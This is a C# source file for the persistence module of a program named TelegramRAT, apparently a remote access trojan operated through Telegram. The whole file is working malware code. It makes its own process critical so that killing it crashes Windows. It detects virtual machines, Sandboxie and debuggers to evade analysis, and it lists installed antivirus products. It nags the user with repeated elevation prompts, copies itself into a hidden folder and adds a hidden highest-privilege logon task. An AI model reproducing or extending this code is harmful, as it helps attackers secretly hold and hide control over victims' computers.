using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace TelegramRAT
{
    internal class persistence
    {

        // Import dll'ls
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);
        public enum EXECUTION_STATE : uint
        {
            ES_CONTINUOUS = 0x80000000,
            ES_DISPLAY_REQUIRED = 0x00000002,
            ES_SYSTEM_REQUIRED = 0x00000001
        }

        // 
        public static void ShutdownListener()
        {
            SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
        }
        
        // If shutdown/reboot
        private static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            telegram.sendText("Go to offline...");
            unprotectProcess();
        }

        // Protect process
        public static void protectProcess()
        {
            if(config.ProcessProtectionEnabled)
            {
                try
                {
                    SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
                    Process.EnterDebugMode();
                    RtlSetProcessIsCritical(1, 0, 0);
                }
                catch { }
            }
        }

        // Unprotect process
        public static void unprotectProcess()
        {
            if (config.ProcessProtectionEnabled)
            {
                try
                {
                    RtlSetProcessIsCritical(0, 0, 0);
                }
                catch {
                    while (true)
                    {
                        System.Threading.Thread.Sleep(100000); //prevents a BSOD on exit failure
                    }
                }
            }
        }

        // VirtualBox
        public static bool inVirtualBox()
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                try
                {
                    using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                    {
                        foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                        {
                            if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                            {
                                return true;
                            }
                        }
                    }
                }
                catch
                {
                    return true;
                }
            }
            foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
            {
                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
                {
                    return true;
                }
            }
            return false;
        }

        // SandBoxie
        public static bool inSandboxie()
        {
            string[] array = new string[5]
            {
                "SbieDll.dll",
                "SxIn.dll",
                "Sf2.dll",
                "snxhk.dll",
                "cmdvrt32.dll"
            };
            for (int i = 0; i < array.Length; i++)
            {
                if (GetModuleHandle(array[i]).ToInt32() != 0)
                {
                    return true;
                }
            }
            return false;
        }

        // Debugger
        public static bool inDebugger()
        {
            try
            {
                long ticks = DateTime.Now.Ticks;
                System.Threading.Thread.Sleep(10);
                if (DateTime.Now.Ticks - ticks < 10L)
                {
                    return true;
                }
            }
            catch { }
            return false;
        }

        // Detect antiviruses
        public static string DetectAntivirus()
        {
            try
            {
                using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
                {
                    List<string> av = new List<string>();
                    foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
                    {
                        av.Add(searchResult["displayName"].ToString());
                    }
                    if (av.Count == 0) return "N/A";
                    return string.Join(", ", av.ToArray()) + ".";
                }
            }
            catch
            {
                return "N/A";
            }
        }


        //  TaskScheduler command
        private static void TaskSchedulerCommand(string args)
        {
            // If autorun disabled
            if(!config.AutorunEnabled)
            { return; }
            // Add to autorun
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "schtasks.exe";
            startInfo.Arguments = args;
            process.StartInfo = startInfo;
            process.Start();
            process.WaitForExit();
        }

        // Elevate previleges
        public static void elevatePrevileges()
        {
            while (true)
            {
                // Elevate previleges
                if (!utils.IsAdministrator())
                {
                    Process proc = new Process();
                    proc.StartInfo.FileName = Application.ExecutablePath;
                    proc.StartInfo.UseShellExecute = true;
                    proc.StartInfo.Verb = "runas";
                    try
                    {
                        proc.Start();
                        proc.WaitForExit();
                        unprotectProcess();
                        Environment.Exit(1);
                    }
                    catch (System.ComponentModel.Win32Exception)
                    { 
                        if(config.AdminRightsRequired)
                        { continue; } else { break; }
                    }
                } else { break; }
            }
        }

        
        // Copy self to system
        public static void installSelf()
        {
            if(!Directory.Exists(Path.GetDirectoryName(config.InstallPath)))
            {
                // Create dir
                Directory.CreateDirectory(Path.GetDirectoryName(config.InstallPath));
            }
            if(!System.IO.File.Exists(config.InstallPath))
            {
                // Copy
                System.IO.File.Copy(Application.ExecutablePath, config.InstallPath);
                // Hide dir
                if(config.HideDirectoryEnabled)
                {
                    DirectoryInfo dir = new DirectoryInfo(Path.GetDirectoryName(config.InstallPath));
                    dir.Attributes = FileAttributes.Hidden;
                }
            }
        }

        // Install to startup
        public static void setAutorun()
        {
            TaskSchedulerCommand("/create /f /sc ONLOGON /RL HIGHEST /tn \"" + config.AutorunName + "\" /tr \"" + config.InstallPath + "\"");
        }

        // Uninstall from startup
        public static void delAutorun()
        {
            TaskSchedulerCommand("/delete /f /tn \"" + config.AutorunName + "\"");
        }

        // prevent pc to idle\sleep
        public static void PreventSleep()
        {
            try
            {
                SetThreadExecutionState(EXECUTION_STATE.ES_SYSTEM_REQUIRED | EXECUTION_STATE.ES_CONTINUOUS | EXECUTION_STATE.ES_DISPLAY_REQUIRED);
            }
            catch { }
        }


    }
}
